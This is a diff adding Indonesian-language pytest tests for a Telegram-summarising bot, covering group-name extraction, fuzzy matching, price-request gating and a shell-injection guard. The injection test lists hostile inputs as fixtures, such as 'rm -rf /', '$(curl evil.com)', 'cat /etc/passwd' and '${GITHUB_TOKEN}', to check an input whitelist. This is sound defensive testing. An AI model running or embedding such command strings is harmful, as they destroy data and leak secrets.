@@ -5083,3 +5083,107 @@ def test_kegagalan_baca_meninggalkan_jejak():
     assert "[riwayat]" in blok and "tidak terbaca" in blok
     d = open(os.path.join(AKAR, "cloud", "derivatif.py"), encoding="utf-8").read()
     assert "arsip gagal ditulis" in d, "0 baris tertulis tidak boleh senyap"
+
+
+# ------------------------- riset satu grup tertentu
+
+@pytest.mark.parametrize("pesan,nama", [
+    ("apa informasi yang menarik dari grup cokri?", "cokri"),
+    ("ada berita terbaru apa dari grup lighter?", "lighter"),
+    ("info dari grup sui indonesia dong", "sui indonesia"),
+    ("ada apa di grup lighter comunity chat", "lighter comunity chat"),
+    ("whats new in group lighter", "lighter"),
+    ("cek grup Bitcoin Price dong", "Bitcoin Price"),
+])
+def test_nama_grup_terbaca_dari_pesan(pesan, nama):
+    assert bot.grup_diminta(pesan) == nama
+
+
+@pytest.mark.parametrize("pesan", [
+    "carikan informasi menarik dari telegram saya",
+    "rangkum grup telegram saya",
+    "apa yang menarik di telegram sebulan ini",
+    "apa kabar dari grup?",
+])
+def test_tanpa_nama_grup_hasilnya_none_bukan_kosong(pesan):
+    """None berarti "baca sesuai kategori seperti biasa", BUKAN "tidak ada grup".
+    Menganggapnya nama grup kosong akan menyaring ke nol grup lalu melaporkan tidak ada
+    apa-apa — padahal user meminta seluruh grupnya."""
+    assert bot.grup_diminta(pesan) is None
+
+
+def test_pencocokan_grup_longgar_tapi_ambigu_ditanyakan():
+    """Diminta user: nama boleh tidak lengkap ("lighter" -> Lighter Community Chat), dan
+    kalau ada beberapa yang mirip agent BERTANYA, bukan menebak."""
+    semua = ["Lighter Community Chat \U0001F1EE\U0001F1E9", "Lighter Announcements",
+             "SUI Indonesia", "Suiswap Official", "Cokri Crypto Community",
+             "Bitcoin Price", "Watcher Guru"]
+    assert _tg.cocokkan_grup("cokri", semua) == (["Cokri Crypto Community"], "tepat")
+    assert _tg.cocokkan_grup("sui indonesia", semua) == (["SUI Indonesia"], "tepat")
+    # Nama panjang dengan salah ketik tetap ketemu — "comunity" untuk "Community".
+    cocok, st = _tg.cocokkan_grup("lighter comunity chat", semua)
+    assert st == "tepat" and cocok[0].startswith("Lighter Community")
+    # Salah ketik pada nama PENDEK juga.
+    assert _tg.cocokkan_grup("cokry", semua)[1] == "tepat"
+    # Yang ambigu TIDAK ditebak.
+    for q in ("lighter", "sui"):
+        cocok, st = _tg.cocokkan_grup(q, semua)
+        assert st == "ambigu" and len(cocok) > 1, q
+    assert _tg.cocokkan_grup("zzz", semua) == ([], "tidak_ada")
+    # Emoji & bendera di nama grup tidak boleh mengganggu.
+    assert _tg._rata("Lighter Community Chat \U0001F1EE\U0001F1E9") == "lighter community chat"
+
+
+def test_ambigu_tidak_membaca_apa_pun():
+    """Menebak grup yang salah menghabiskan jatah baca pada isi yang tidak diminta, dan
+    yang benar-benar diminta tidak pernah terbaca — sementara penandanya telanjur maju."""
+    src = open(os.path.join(AKAR, "cloud", "tgbaca.py"), encoding="utf-8").read()
+    blok = src[src.index('if status == "ambigu"'):]
+    blok = blok[:blok.index('if status == "tidak_ada"')]
+    assert "PERLU DIPERJELAS" in blok and "TANYAKAN" in blok
+    assert "JANGAN " in blok and "menebak" in blok and "return" in blok
+    # Modelnya juga harus diberi tahu cara memperlakukan blok itu.
+    p = bot.build_chat_prompt("apa informasi menarik dari grup cokri di telegram")
+    assert "PERLU DIPERJELAS" in p and "BERHENTI" in p
+
+
+def test_harga_btc_dibaca_dari_grup_dan_digerbangi():
+    """Grup pemberi harga berguna sebagai PEMBANDING, bukan pengganti API. Tapi bloknya
+    ikut di SETIAP permintaan Telegram kalau tidak digerbangi, padahal sebagian besar
+    permintaan tidak menanyakan harga."""
+    for ya in ("berapa harga btc sekarang di telegram", "cek harga bitcoin dari tele",
+               "btc price now"):
+        assert bot.minta_harga_btc(ya), ya
+    for tidak in ("apa informasi menarik dari grup cokri", "rangkum telegram saya",
+                  "harga eth berapa"):
+        assert not bot.minta_harga_btc(tidak), tidak
+
+    src = open(os.path.join(AKAR, "cloud", "tgbaca.py"), encoding="utf-8").read()
+    assert "harga_btc(k) if a.harga else None" in src, "harga wajib digerbangi"
+    assert "_KONTEKS_HARGA" in src, "angka saja tidak cukup untuk dianggap harga"
+    alur = open(os.path.join(AKAR, ".github", "workflows", "bot.yml"),
+                encoding="utf-8").read()
+    assert "--grup-sebut" in alur and "--harga" in alur
+    # Modelnya diberi tahu ini pembanding, bukan pengganti.
+    p = bot.build_chat_prompt("berapa harga btc terbaru di telegram")
+    assert "HARGA BTC DARI GRUP" in p and "PEMBANDING" in p
+
+
+def test_nama_grup_tidak_bisa_menyuntik_shell():
+    """Teks pesan user kini mengalir ke perintah shell di workflow lewat
+    steps.tg.outputs.grup. Yang menjaganya adalah DAFTAR PUTIH karakter di regex
+    pengekstrak — bukan pelolosan di sisi shell. Kalau daftar itu pernah dilonggarkan,
+    tes ini yang harus berteriak lebih dulu."""
+    berbahaya = set('"$`;|&<>\n\r\()${}')
+    for jahat in ('grup "; rm -rf / ; echo "', "grup $(curl evil.com)",
+                  "grup `whoami`", 'grup a"b', "grup a; cat /etc/passwd",
+                  "grup ${GITHUB_TOKEN}", "grup a\nb", "grup a$IFS$9b"):
+        v = bot.grup_diminta(jahat)
+        assert not (set(v or "") & berbahaya), (jahat, v)
+    # Panjangnya juga dibatasi supaya tidak membengkakkan perintah.
+    assert len(bot.grup_diminta("grup " + "A" * 300) or "") <= 31
+
+
+def test_cocokkan_grup_tahan_masukan_kosong():
+    for arg in (("x", []), ("", ["A"]), (None, ["A"]), ("x", None)):
+        assert _tg.cocokkan_grup(*arg) == ([], "tidak_ada"), arg
